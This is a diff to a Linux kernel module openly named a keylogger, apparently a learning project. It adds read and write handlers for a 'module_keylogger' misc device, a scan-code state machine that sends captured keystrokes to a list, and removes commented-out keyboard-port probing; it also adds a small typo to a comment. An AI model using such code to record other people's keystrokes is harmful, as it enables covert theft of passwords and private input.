@@ -10,6 +10,11 @@ static unsigned int windex = -1;
 
 static unsigned int rindex = 0;
 
+static struct file_operations keylogger_misc_fops = {
+	.read = keylogger_read,
+	.write = keylogger_write,
+};
+
 static struct miscdevice keylogger_misc = {
 	.minor = MISC_DYNAMIC_MINOR,
 	.name = "module_keylogger",
@@ -17,6 +22,15 @@ static struct miscdevice keylogger_misc = {
 };
 
 LIST_HEAD(keystroke_list);
+
+static struct fsm scan_fsm = {
+	.ct = 0,
+	.state = UNDEFINED,
+	.key = 0,
+	.position = -1,
+	.name = NULL,
+};
+
 
 /* Assumption : if windex overrun rindex then static size is too small  */
 /* To be revised */
@@ -38,11 +52,11 @@ static void do_tasklet(unsigned long unused)
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
 		if (scan_fsm.state == SUCCESS)
-			scan_fsm_send(&scan_fsm, keystroke_array);
+			scan_fsm_send(&scan_fsm, &keystroke_list);
 		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
 			scan_fsm_clear(&scan_fsm);	
 		/* state machine
-		 *  if SUCCESS, format packet and send it to buffer
+		 *  if SUCCESS, format packet and& send it to buffer
 		 *  if ERROR, flush fsm
 		 */
 		
@@ -75,9 +89,6 @@ irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 static int __init keylogger_init(void)
 {
 	int		result;
-/*	unsigned int	r; */
-	unsigned int	try = 0;
-	unsigned int	scan_set = 0;
 
 	result = misc_register(&keylogger_misc);
 	if (result) {
@@ -94,17 +105,6 @@ static int __init keylogger_init(void)
 		
 		goto err;
 	}
-	
-	/* Read Status Byte or IRQ ? */
-/*	outb(SCAN_SET, KEYBOARD_PORT);
-	r = inb(KEYBOARD_PORT);
-	printk(KERN_INFO "after SCAN_SET, caught [%x]\n", r);
-	outb(SCAN_SET_DATA, KEYBOARD_PORT);
-	r = inb(KEYBOARD_PORT);
-	printk(KERN_INFO "after SCAN_SET_DATA, caught [%x]\n", r);
-	r = inb(KEYBOARD_PORT);
-	printk(KERN_INFO "caught [%x]\n", r);
-*/
 	
 	return result;
 
